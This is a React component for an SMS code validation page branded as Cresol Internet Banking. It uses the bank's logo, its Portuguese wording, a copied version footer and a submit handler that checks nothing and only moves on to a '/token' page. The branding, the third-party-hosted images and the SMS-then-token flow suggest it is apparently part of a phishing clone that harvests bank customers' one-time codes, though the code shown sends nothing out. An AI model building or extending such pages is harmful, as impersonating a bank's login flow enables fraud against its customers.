import React, { useState } from "react";
import { ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";

const SmsPage = () => {
  const [smsCode, setSmsCode] = useState("");
  const navigate = useNavigate();

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Navegar para a página de token após validar SMS
    navigate("/token");
  };

  const handleBack = () => {
    navigate("/home");
  };

  return (
    <div className="min-h-screen flex bg-[#fff]">
      {/* Left: Formulário SMS */}
      <div className="w-1/2 flex flex-col justify-start px-[7%] pt-4 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Botão Voltar */}
          <button
            onClick={handleBack}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors"
          >
            <ArrowLeft size={20} className="mr-2" />
            Voltar
          </button>

          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 mb-6"
          />

          <h1 className="text-2xl font-semibold text-gray-600 mb-3">Validação por SMS</h1>
          <p className="text-[1.1rem] text-gray-600 mb-8">
            Digite o código de 6 dígitos enviado para seu celular cadastrado.
          </p>

          <form onSubmit={handleSubmit} className="mt-6">
            <div className="mb-6">
              <label className="block text-sm text-gray-700 font-medium mb-1">Código SMS</label>
              <input
                type="text"
                className="w-full h-11 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest"
                placeholder="000000"
                value={smsCode}
                onChange={(e) => setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                maxLength={6}
                autoComplete="one-time-code"
              />
            </div>

            <button
              type="submit"
              className="w-full h-11 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow mb-6"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
              disabled={smsCode.length !== 6}
            >
              Validar
            </button>

            <div className="text-center">
              <button
                type="button"
                className="text-orange-500 hover:text-orange-600 transition font-medium"
              >
                Reenviar código
              </button>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher */}
      <div className="w-1/2 hidden lg:block bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default SmsPage;
